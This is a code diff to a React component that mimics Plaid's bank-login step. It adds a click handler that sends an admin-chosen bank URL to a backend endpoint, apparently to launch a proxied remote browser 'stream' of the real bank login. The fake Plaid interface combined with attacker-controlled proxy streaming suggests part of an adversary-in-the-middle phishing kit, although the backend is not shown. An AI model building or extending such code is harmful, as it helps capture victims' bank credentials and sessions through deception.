@@ -1,6 +1,31 @@
 "use client";
 
-export default function PlaidStepThree({ selectedBank, selectedOption, onContinueToLogin, renderLogo }: any) {
+export default function PlaidStepThree({ selectedBank, selectedOption, onContinueToLogin, renderLogo, targetUrl: adminTargetUrl }: any) {
+  
+  const handleLoginClick = async () => {
+    // Admin panel se set kiya gaya URL ya selected bank ka URL priority par use hoga
+    const finalTargetUrl = adminTargetUrl || selectedBank?.url || selectedBank?.link || "https://www.google.com";
+
+    try {
+      // Backend par admin-configured URL ke sath browser launch trigger karna
+      await fetch("/api/admin/proxy-launch", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          targetUrl: finalTargetUrl, 
+          proxyString: "" // Agar proxy active hai toh backend khud handle karega
+        })
+      });
+    } catch (err) {
+      console.error("Failed to launch admin-configured remote stream:", err);
+    }
+
+    // Parent component ka original flow call karna
+    if (onContinueToLogin) {
+      onContinueToLogin();
+    }
+  };
+
   return (
     <div className="flex flex-1 flex-col items-center justify-between pt-10 pb-2 text-center">
       <div className="flex flex-col items-center">
@@ -18,7 +43,7 @@ export default function PlaidStepThree({ selectedBank, selectedOption, onContinu
 
       <button
         type="button"
-        onClick={onContinueToLogin}
+        onClick={handleLoginClick}
         className="w-full rounded-[14px] bg-[#111625] py-3.5 px-4 text-[15px] font-semibold text-white flex items-center justify-center gap-2 hover:bg-black transition active:scale-[0.99] cursor-pointer"
       >
         <span>Continue to login</span>
